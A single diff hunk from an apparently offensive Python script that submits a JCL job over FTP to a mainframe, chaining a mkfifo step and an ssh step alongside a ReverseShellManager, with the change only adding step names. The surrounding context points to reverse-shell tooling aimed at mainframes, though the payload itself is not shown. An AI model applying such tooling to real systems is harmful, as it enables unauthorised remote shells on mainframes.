@@ -163,8 +163,8 @@ if __name__ == '__main__':
                                                 STARTSEND=ReverseShellManager.TERMINATOR_STRING,
                                                 TESTPATH=testpath)
     JCL = Job('FTPJOB')
-    JCL.add_inline(mkfifo_step)
-    JCL.add_inline(ssh_step)
+    JCL.add_inline(mkfifo_step, step_name='SHSTEP')
+    JCL.add_inline(ssh_step, step_name='SHSTEP')
     # Submit the job
     logging.info('Submit job card to the mainframe')
     ftp.run_jcl(JCL.render())
